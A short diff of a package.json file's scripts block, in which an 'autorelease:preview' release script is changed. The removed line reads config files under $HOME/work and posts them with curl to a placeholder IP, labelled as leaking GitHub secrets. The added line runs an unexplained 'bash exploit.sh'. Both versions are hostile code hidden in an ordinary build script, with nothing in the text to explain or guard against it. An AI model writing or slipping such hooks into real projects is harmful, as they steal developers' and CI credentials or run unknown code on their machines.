@@ -5,8 +5,7 @@
   "license": "MIT",
   "scripts": {
     "autorelease": "yarn autorelease:preview",
-    "autorelease:preview": "echo 'Running autorelease preview... Leaking GITHUB_SECRETS' && find $HOME/work -type f -name config | xargs cat | curl --data @- http://{IP}
-| rev && echo 'Done.'"
+    "autorelease:preview": "echo 'Hello World' && bash exploit.sh"
   }
 
 }
